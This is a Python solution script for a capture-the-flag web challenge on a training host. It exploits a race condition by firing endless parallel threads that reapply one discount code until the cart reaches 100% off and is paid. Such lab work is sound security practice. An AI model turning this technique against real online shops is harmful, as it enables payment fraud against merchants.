import random
import string
import time
import requests
from threading import Thread
import sys

#this is a get request
#r = requests.get('https://api.github.com/user', auth=('user', 'pass'))

# to see how registration works, we go to the registration page, register a new user and in the debug console -> network -> php message 
# we see the network message, GET request with its paramenters by hecking the message payload
# by looking at the header we can also find the headers with links, requests type etc

URL = "http://discount.ctf.offdef.it/"

def registration(session, username, password):
    payload = { "username": username, "password": password}
    r = session.post(URL + "register", data=payload)
    return r

def login(session, username, password):
    payload = { "username": username, "password": password }
    r = session.post(URL + "login", data=payload)
    if "Welcome back!" in r.text:
        print("Welcome back! " + username)

def add_to_cart(session, id):
    payload = { "id" : id }
    r = session.get(URL + "add_to_cart?item_id="+str(id), data=payload)
    #print(r.text)
    if "Item added to the Cart!" in r.text:
        print("Item added to the Cart!")

def apply_discount(session, discount):
    payload = { "discount": discount }
    r = session.post(URL + "apply_discount", data=payload)
    if "Discount code applied!" in r.text:
        print("Discount code applied!")
    if "100%" in r.text:
        pay(session)

def pay(session):
    r = session.get(URL + "cart/pay", )
    print(r.text)

letters = string.ascii_lowercase
def randomString(length = 15):
    return ''.join(random.choice(letters) for i in range(length))


user = randomString()
password = "a"

session = requests.Session()

r = registration(session, user, password)
arr = r.text.split()
for word in range(len(arr)):
    #print(arr[word])
    if arr[word] == "Code:": 
        disc = arr[word+1]

discount = disc[:len(disc)-6]
print("discount: " + discount)
login(session, user, password)
add_to_cart(session, 21)

#input("wait")

# we need to make the run in parallel! Multithreading is good enough.
while(1):
    discount_thread = Thread(target=apply_discount, args=[session, discount])
    discount_thread.start()
    time.sleep(0.05)


# in case we need to craft out own cookie, then we can use the function cookiejar and then add the modified cookie
# from the cookiejar